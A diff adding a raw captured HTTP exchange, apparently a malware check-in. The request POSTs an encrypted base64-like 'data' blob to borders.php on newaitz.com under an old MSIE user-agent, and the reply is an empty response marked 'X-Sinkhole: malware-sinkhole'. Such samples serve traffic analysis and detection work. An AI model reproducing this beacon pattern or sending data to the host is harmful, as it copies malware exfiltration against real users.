@@ -1,0 +1,18 @@
+POST /borders.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
+Host: newaitz.com
+Content-Length: 313
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+data=/CjEfcfWvhXdjKt0vUdg7Hu/zb0U5YsemQj5/jDg0FQ2lJg/o8JtvpacG+niBkG/g+7VCC/19kbuOHp7eRcHPiYo99wMUujgUW4bvTIdN/jPXuGPjaBzxlcc5mpN01a6t/QiSXXwpz9Hm0kz9fBfaUn10x/GLcofRiH4LvFsAiGYFsaioMW07K0E3rkk3MeZUygDeLGw2s12+oPMNrnJZczhzZ8xmtPw2x45yoQhkFnoRZqWODqPirsznjDhFzXNNiYGPxzwoAqGOgd49teBFr7C64EKb3d8nfsRLxJuuDQiwQg/oU0=HTTP/1.1 200 OK
+Date: Thu, 11 Aug 2011 08:38:08 GMT
+Server: Apache/2.2.16 (Amazon)
+X-Powered-By: PHP/5.3.3
+X-Sinkhole: malware-sinkhole
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
